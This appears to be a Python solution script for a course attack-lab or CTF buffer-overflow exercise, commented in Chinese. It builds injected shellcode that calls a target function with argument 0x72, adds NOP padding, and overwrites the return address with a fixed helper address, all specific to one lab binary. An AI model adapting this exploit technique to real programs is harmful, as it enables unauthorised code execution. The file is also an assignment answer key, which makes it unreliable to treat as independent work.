import struct

# 构造 shell，目标func1(0x72)0x401216
shell = b''
shell += b'\xbf\x72\x00\x00\x00'      # mov edi, 0x72 (5 bytes)
shell += b'\x48\xc7\xc0\x16\x12\x40\x00'      # mov rax, 0x401216 (7 bytes)
shell += b'\xff\xd0'        # call rax (2 bytes)

# Padding（Buffer 32字节，Saved RBP 8字节）
# 需要填充 40 - len(shell)字节
len = 40 - len(shell)
padding = b'\x90' * len  # 使用 NOP 填充

# 覆盖返回地址，跳到 helper 函数 jmp_xs 0x401334
jmp_xs = 0x401334
ret_addr = struct.pack('<Q', jmp_xs)

# Payload
payload = shell + padding + ret_addr
with open('answer3.txt', 'wb') as f:
    f.write(payload)

print(f"answer3已生成")